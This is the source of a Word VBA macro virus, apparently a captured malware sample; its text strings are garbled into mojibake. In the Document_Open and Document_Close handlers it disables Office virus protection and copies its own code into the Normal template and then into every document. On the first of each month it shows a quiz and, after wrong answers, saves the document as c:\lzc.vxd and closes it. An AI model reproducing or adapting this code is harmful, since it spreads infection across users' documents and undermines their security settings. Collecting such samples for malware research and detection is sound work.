Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True



Dim DI As Boolean, TI As Boolean, d As Object, t As Object, Src As String, r As String


Private Sub Document_Close()
On Error Resume Next

Set d = ActiveDocument.VBProject.VBComponents.Item(1)
Set t = NormalTemplate.VBProject.VBComponents.Item(1)

DI = d.CodeModule.Find("|fffd||fffd||fffd||fffd||fffd||fffd||2fe||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||2b6||fffd||fffd|", 1, 1, 10000, 10000)
TI = t.CodeModule.Find("|fffd||fffd||fffd||fffd||fffd||fffd||2fe||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||2b6||fffd||fffd|", 1, 1, 10000, 10000)

Options.VirusProtection = False

  If DI And Not (TI) Then
    Src = d.CodeModule.Lines(1, d.CodeModule.CountOfLines)
    t.CodeModule.DeleteLines 1, t.CodeModule.CountOfLines
    t.CodeModule.AddFromString Src
    NormalTemplate.Save
    
  ElseIf TI And Not (DI) Then
If Day(Now()) = 1 Then
 Do
 r = UCase(InputBox("|fffd||fffd||fffd||fffd||5ae||fffd||1f3||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?" & Chr(13) & Chr(13) _
 & "A.3|fffd||fffd|4  B.3|fffd||fffd|5  C.3|fffd||fffd|55  D.3|fffd||fffd|7" & Chr(13) & Chr(13) _
 & "|4aa||fffd||fa||fffd||2fc||fffd||fffd||4f4|!", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"))
 Loop Until r <> ""
 If r = "B" Then
   MsgBox "|fffd||f0||fffd||4f4|!"
   GoTo 10
 Else
   MsgBox "|fffd||fffd|!|fffd||678||fffd||fffd||fffd||4bb||fffd||3bb||fffd||fffd||fffd|."
    Do
     r = UCase(InputBox("|fffd||fffd||fffd||fffd||5ae||fffd||fffd|FBA|fffd||fffd||2b2||f4||fffd||fffd|?" & Chr(13) & Chr(13) _
     & "A.|fffd||fffd||5fc||fffd||fffd|  B.|fffd||fffd||368||fffd||fffd|  C.|fffd||fffd||fffd||fffd||fffd||fffd|" & Chr(13) & Chr(13) _
     & "|fffd||fffd||fffd||fffd||fffd||fffd||67b||634||fffd|!", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"))
    Loop Until r <> ""
      If r = "C" Then
        MsgBox "|43b||43b||fffd||fffd||fffd||5a7||fffd||fffd|!"
        GoTo 10
      Else
        MsgBox "|fffd||fffd||fffd||fffd|!|fffd||fffd||fffd||fffd||fffd||fffd||fffd||4bb||fffd||3bb||fffd||fffd||fffd|."
          Do
           r = UCase(InputBox("|fffd||fffd||22b||fffd||fffd||fffd||fffd||fffd||1f8||fffd||2b2||f4||fffd||f5||fffd|?" & Chr(13) & Chr(13) _
           & "A.|fffd||fffd||5b9||5f2||fffd||fffd|  B.|fffd||fffd||5b9||fffd||eec|  C.|5f2||fffd||fffd||2b1||fffd||fffd||fffd||fffd||fffd||fffd||2bb||531|" & Chr(13) & Chr(13) _
           & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||4bb||fffd||3bb||fffd||fffd||fffd||4f4|!", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"))
          Loop Until r <> ""
           If r = "C" Then
             MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!"
             GoTo 10
           Else
             MsgBox "|fffd||fffd||fffd||fffd||fffd||3ef9||fffd||fffd||4aa||fffd||533||fffd||fffd||fffd||5ae||fffd||1f6||fffd||fffd||fffd||2fd||fffd|..."
             ActiveDocument.SaveAs "c:\lzc.vxd"
             ActiveDocument.Close
             Exit Sub
           End If
      End If
 End If
End If
10:
    Src = t.CodeModule.Lines(1, t.CodeModule.CountOfLines)
    d.CodeModule.DeleteLines 1, d.CodeModule.CountOfLines
    d.CodeModule.AddFromString Src
    ActiveDocument.Save
      
  End If


End Sub

Private Sub Document_Open()
On Error Resume Next

Set d = ActiveDocument.VBProject.VBComponents.Item(1)
Set t = NormalTemplate.VBProject.VBComponents.Item(1)

DI = d.CodeModule.Find("|fffd||fffd||fffd||fffd||fffd||fffd||2fe||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||2b6||fffd||fffd|", 1, 1, 10000, 10000)
TI = t.CodeModule.Find("|fffd||fffd||fffd||fffd||fffd||fffd||2fe||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||2b6||fffd||fffd|", 1, 1, 10000, 10000)

Options.VirusProtection = False

  If DI And Not (TI) Then
    t.CodeModule.DeleteLines 1, t.CodeModule.CountOfLines
    
  ElseIf TI And Not (DI) Then
    d.CodeModule.DeleteLines 1, d.CodeModule.CountOfLines
      
  End If
  
End Sub









































































































































INQUEST-PP=macro
